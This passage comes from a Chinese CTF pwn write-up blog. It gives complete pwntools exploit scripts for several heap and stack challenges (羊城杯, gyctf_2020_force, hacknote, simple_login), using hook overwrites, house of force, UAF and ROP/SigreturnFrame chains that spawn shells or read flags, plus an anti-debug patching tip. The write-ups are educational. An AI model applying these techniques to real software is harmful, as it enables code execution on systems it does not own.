<p>借着前面的堆块重叠，往free_hook里面写setcontext+53就行，然后就是最后的堆上布置rop链，堆块给的够大，那就直接选择最大的堆块进行布置，因为要先申请一个0x20的堆块，剩下的大小不够0x100，所以堆块的位置是在最下方的，然后在上面布置好rop，最后就是在setcontext的gadget指向的相应位置写好，跳转执行就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924220626687.png"><span class="image-caption">image-20210924220626687</span></p>
<p>成功读取flag！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./name&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;name size:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;name:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>羊城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>buu08</title>
    <url>/2021/09/05/2021-09-05-buu08/</url>
    <content><![CDATA[<h2 id="一、pwnable-simple-login"><a href="#一、pwnable-simple-login" class="headerlink" title="一、pwnable_simple_login"></a>一、pwnable_simple_login</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105207938.png"><span class="image-caption">image-20210910105207938</span></p>
<p>常规checksec，开了NX、Canary。但是到IDA里面发现，没看到Canary的踪迹</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105257032.png"><span class="image-caption">image-20210910105257032</span></p>
<p>IDA里面有后门函数</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105318680.png"><span class="image-caption">image-20210910105318680</span></p>
<p>base64解码函数里面有些复杂，看的很难受，但是我们可以通过程序逻辑进行判断，返回的应该是长度，因为底下进行了比大小；而s是我们输入的值没什么好说，就是要输入一个base64的值让他再解码成正常值；v5则应该是解码后的值，因为底下把v5的值写入了input里面。但是如果是要以程序逻辑执行到后门函数的话，我也不知道行不行，反正我是不会的。想的肯定是有没有哪里有溢出，跳到后门函数就行了。</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105421986.png"><span class="image-caption">image-20210910105421986</span></p>
<p>找了找，在auth函数里面，memcpy可以溢出了，因为size最大可以为12，而v4距离返回值偏移也为12，似乎不够，只能覆盖到ebp，不过可以发现，在这个函数里面执行一次leave ret，然后这个函数退出了，到main函数，刚好又将会继续执行leave ret。所以其实就是一种栈迁移，把栈迁移到.bss上去，然后执行后门函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25575</span>)<br>shell = <span class="hljs-number">0x08049284</span><br>input_addr = <span class="hljs-number">0x0811EB40</span><br>p.recvuntil(<span class="hljs-string">&quot;Authenticate : &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(shell) + p32(input_addr)<br>p.sendline(payload.encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="二、gyctf-2020-force"><a href="#二、gyctf-2020-force" class="headerlink" title="二、gyctf_2020_force"></a>二、gyctf_2020_force</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916151101226.png"><span class="image-caption">image-20210916151101226</span></p>
<p>常规checksec一下，64位保护全开</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916153042695.png"><span class="image-caption">image-20210916153042695</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916153101689.png"><span class="image-caption">image-20210916153101689</span></p>
<p>进入IDA，总共就两个功能：一个是申请堆块，堆块大小无限制，并且能返回给堆地址，然后填入内容是固定长度0x50；另外一个puts功能。。。屁用没有！根据题目提示想到house of force</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916163309864.png"><span class="image-caption">image-20210916163309864</span></p>
<p>因为程序会返回堆的地址，程序又不限制堆块的大小，所以我们可以申请一个大于top chunk的堆块，那么程序就会调用mmap进行分配堆块，此时堆块的地址会是libc中的一个地址</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916163532720.png"><span class="image-caption">image-20210916163532720</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916205725583.png"><span class="image-caption">image-20210916205725583</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916205619022.png"><span class="image-caption">image-20210916205619022</span></p>
<p>然后申请一个小于0x50的堆块，让堆块能进行溢出覆盖top chunk的size位，修改为-1（也就是0xFFFFFFFFFFFFFFFF），同时也借着这个堆块能获取到top chunk的地址。修改完-1，因为使用malloc申请堆块时验证size的类型是无符号数，所以我们可以分配很大的堆块也仍然可以通过验证，借此直接申请一个超大堆块，直接占满top chunk与__malloc_hook之间长度，然后再申请一个堆块去修改hook的为one_gadget即可</p>
<p>然后呢。offse至少t减0x30，因为我们申请的堆块是有堆头，并且是要覆盖两个hook</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916201004797.png"><span class="image-caption">image-20210916201004797</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916201128484.png"><span class="image-caption">image-20210916201128484</span></p>
<p>最后的调整我有些理解不了，明明指向不是0，但最后却能getshell，只能说明应该是在最后执行完malloc后，rsp又被调整了吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>	addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;content\n&quot;</span>)<br>	p.send(content)<br>	<span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="三、pwnable-hacknote"><a href="#三、pwnable-hacknote" class="headerlink" title="三、pwnable_hacknote"></a>三、pwnable_hacknote</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153219237.png"><span class="image-caption">image-20210923153219237</span></p>
<p>常规checksec，32位，没开全RELRO，PIE。猜测可以劫持got表</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153712466.png"><span class="image-caption">image-20210923153712466</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153919700.png"><span class="image-caption">image-20210923153919700</span></p>
<p>在申请堆块功能里，发现一个有意思的东西，把一个调用puts的函数的地址赋值给了堆块内容，猜测打印功能就是直接使用这个函数指针，那么就可以试着修改这个指针，改为system，再把堆块内容修改为/bin/sh</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153939335.png"><span class="image-caption">image-20210923153939335</span></p>
<p>果然，直接调用了函数指针</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153908205.png"><span class="image-caption">image-20210923153908205</span></p>
<p>释放功能，指针没有置零，存在UAF</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923193256099.png"><span class="image-caption">image-20210923193256099</span></p>
<p>第一步是获取libc，我的做法是借着释放unsorted chunk产生libc，然后再申请回来，覆盖fd指针为aaaa作为定位，然后将bk指针打印出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot;;sh\x00&quot;</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#2</span><br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>libc_base = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1B37B0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.info(<span class="hljs-built_in">hex</span>(system))<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923193522763.png"><span class="image-caption">image-20210923193522763</span></p>
<p>然后就是修改函数指针，把函数指针改成指向system的，通过连续释放两个堆块，然后再申请回来（大小是0x8的），那么就会有一个堆块是之前可以调用show功能的堆块，修改这个堆块的内容为system地址，以及”;sh\x00”（或是”||sh”），因为上图传入的参数其实是函数指针的地址，所以要用<code>；</code>或者<code>||</code>才能也执行到sh而获取到shell，然后借着UAF执行show功能getshell</p>
<p>最后，我换了网上的做法，我前面使用unsorted chunk泄露libc可能远程有点不同，导致没能打通，只有本地通了</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210924081921009.png"><span class="image-caption">image-20210924081921009</span></p>
<p>然后我去实验了一下，发现远程的地址比本地的多了0x300，我打了五六次都是差0x300，之前做buu的堆题获取libc的方式，我已经记不清了，因为buu上的libc是被动过的libc，所以我本地打的时候加载的并不是和buu一模一样的libc，可能这就是因为小版本之间的差异吧，不过根据这次来看，版本之间的小差异，对算libc偏移造成的影响应该是比较小的，前后多试几个0xn00，说不定能行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26554</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts = <span class="hljs-number">0x804862b</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(puts) + p32(read_got))<br>show(<span class="hljs-number">0</span>)<br>read = u32(p.recv(<span class="hljs-number">4</span>))<br>system = read - libc.symbols[<span class="hljs-string">&quot;read&quot;</span>] + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>success(<span class="hljs-built_in">hex</span>(system))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>, p32(system) + <span class="hljs-string">&quot;;sh\x00&quot;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="四、ciscn-2019-final-4"><a href="#四、ciscn-2019-final-4" class="headerlink" title="四、ciscn_2019_final_4"></a>四、ciscn_2019_final_4</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007190521092.png"><span class="image-caption">image-20211007190521092</span></p>
<p>checksec一下，64位，没开PIE</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007191435082.png"><span class="image-caption">image-20211007191435082</span></p>
<p>delete函数里面存在UAF</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007191927917.png"><span class="image-caption">image-20211007191927917</span></p>
<p>禁用了execve，所以得要rop读取flag</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007192957739.png"><span class="image-caption">image-20211007192957739</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193057775.png"><span class="image-caption">image-20211007193057775</span></p>
<p>似乎无法调试这题，去百度了一下<a href="https://blog.csdn.net/seaaseesa/article/details/105855306%EF%BC%8C%E5%8E%9F%E6%9D%A5%E5%89%8D%E9%9D%A2%E7%9A%84%E4%BB%A3%E7%A0%81%E9%83%BD%E6%98%AF%E4%B8%BA%E4%BA%86%E8%AE%A9%E6%88%91%E4%BB%AC%E6%97%A0%E6%B3%95%E8%B0%83%E8%AF%95%E7%9A%84%E3%80%82%60ptrace%60">https://blog.csdn.net/seaaseesa/article/details/105855306，原来前面的代码都是为了让我们无法调试的。`ptrace`</a> 提供了一种机制使得父进程可以观察和控制子进程的执行过程。父进程 fork() 出子进程，子进程中执行我们所想要 trace 的程序，在子进程调用 exec() 之前，子进程需要先调用一次 ptrace，以 PTRACE_TRACEME 为参数。</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193646167.png"><span class="image-caption">image-20211007193646167</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193755639.png"><span class="image-caption">image-20211007193755639</span></p>
<p>所以调试的子进程已经被占用，导致我们无法再生成一个，所以要让这段程序失效，根据师傅的做法是修改汇编代码为<code>jmp $+0x9E</code>，直接跳转到后面的函数去执行，从而避免占用子进程</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007194639451.png"><span class="image-caption">image-20211007194639451</span></p>
<p>用keypatch这样改不了。。。</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195234222.png"><span class="image-caption">image-20211007195234222</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195506179.png"><span class="image-caption">image-20211007195506179</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195609719.png"><span class="image-caption">image-20211007195609719</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195846918.png"><span class="image-caption">image-20211007195846918</span></p>
<p>所以模仿师傅的做法，修改机器码，把对应的机器码修改为上述的e999000000即可，然后就能调试了。</p>
<p>然后说下思路，大方向是orw读取flag，网上师傅的wp是利用前面给的栈地址进行伪造一个堆头，让后续的堆块可以分配过去控制返回地址（并且栈地址还得先要泄露出来），但是因为程序是个死循环，所以还要劫持里面的函数的返回地址，让程序真正的退出，才能去执行布置的rop。我觉得有点麻烦了，不如使用劫持malloc_hook为setcontext + 53，不用劫持这么多的。</p>
<p>好吧，我是沙比，忘了malloc的第一个参数是传入的size，兴冲冲要读flag，看到gdb里面rdi值是0xd0，人傻了，这题本来的做法太麻烦了，我不做了，溜了溜了</p>
<p>那就总结一下思路吧，防止以后比赛遇到了，也能有印象顺着做，慢慢调试</p>
<ul>
<li><p>首先，反调试，可以选择修改ida里面的汇编指令，让反调试的程序不被执行到，从而可以调试。而机器指令可以用pwntools得到</p>
</li>
<li><p>其次，如果可以输入栈的内容，在里面布置堆头，由此推广，在可以输入的地方都可以布置出堆头，让我们可以通过size检查，。当然这仅仅是2.23的版本，之后的版本都不用检查size的。当然布置完堆头就要获得堆头对应的地址</p>
</li>
<li><p>然后，就是environ存着一个栈地址（虽然我本来就知道，当做是复习吧）。布置rop时长度不够写，可以先执行read函数，加长可写的长度</p>
</li>
<li><p>最后，如果程序不退出，可以修改某个函数的返回地址，我们让程序执行到返回地址，执行我们布置好的rop</p>
<p>over！</p>
</li>
</ul>
<p>留下个错误脚本，跑路！</p>
